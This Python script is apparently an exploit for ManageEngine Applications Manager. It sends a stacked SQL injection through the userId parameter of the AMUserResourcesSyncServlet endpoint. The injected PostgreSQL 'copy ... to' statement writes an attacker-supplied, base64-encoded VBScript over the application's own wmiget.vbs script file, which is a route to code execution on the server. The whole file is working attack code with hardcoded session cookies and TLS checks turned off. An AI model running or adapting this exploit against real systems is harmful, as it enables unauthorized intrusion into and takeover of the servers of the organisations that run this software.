import requests
import datetime
import base64
from urllib.parse import quote
def query(paylaod):
	cookies = {
	    'ASPSESSIONIDQGQBCRDA': 'NPONIFMBIADBOKFNDMHIIHFH',
	    'JSESSIONID_APM_9090': '2EB3927814116904770AF102EF74F7BD',
	}
	
	headers = {
	    'Host': 'manageengine:8443',
	    'User-Agent': 'Mozilla/5.0 (X11; Linux x86_64; rv:78.0) Gecko/20100101 Firefox/78.0',
	    'Accept': 'text/html,application/xhtml+xml,application/xml;q=0.9,image/webp,*/*;q=0.8',
	    'Accept-Language': 'en-US,en;q=0.5',
	    'Accept-Encoding': 'gzip, deflate',
	    'Connection': 'close',
	    'Upgrade-Insecure-Requests': '1',
		'Content-Type': 'application/x-www-form-urlencoded',
		'Content-Length': '37023',
	}

	data = 'ForMasRange=1&userId=1;{0}'.format(paylaod)
	response = requests.post('https://manageengine:8443/servlet/AMUserResourcesSyncServlet', headers=headers, data=data, cookies=cookies, verify=False)
	print(response.text)
def generate_payload():
	with open("wmiget.vbs","r") as f :
		data = f.read()
		#print(data)
	string = ''
	#print (data)
	#print (content)
	message = data
	message_bytes = message.encode('utf-8')
	base64_bytes = base64.b64encode(message_bytes)
	base64_message = base64_bytes.decode('utf-8')
	for i in base64_message:
		#print('%{0}'.format(i.encode('utf-8').hex()),end='')
		string =  string + '%{0}'.format(i.encode('utf-8').hex())
	#print (string)
	content = 'copy+(select+convert_from(decode($${0}$$,$$base64$$),$$utf-8$$))+to+$$C:\\Program+Files+(x86)\\ManageEngine\\AppManager12\\working\\conf\\\\application\\scripts\\wmiget.vbs$$;'.format(string)
	return content

content = generate_payload()
starttime = datetime.datetime.now()
query(content)
endtime = datetime.datetime.now()
print (endtime - starttime)

